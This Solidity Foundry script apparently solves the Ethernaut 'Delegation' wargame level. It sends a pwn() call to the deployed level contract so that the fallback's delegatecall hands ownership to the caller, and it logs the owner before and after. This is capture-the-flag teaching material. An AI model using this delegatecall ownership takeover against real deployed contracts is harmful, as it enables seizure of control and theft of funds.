// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
//import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";
import "../src/levels/06-Delegation/Delegation.sol";

contract ExploitScript is Script {
    Delegation level6 = Delegation(payable(0xb143cdA4442f9C8a0100c37c0C0727bFDe8EBC81));

    function run() public {
        vm.startBroadcast();

    console.log("Current owner is: ", level6.owner());
    (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
    console.log("New owner is :", level6.owner());


        vm.stopBroadcast();
    }
}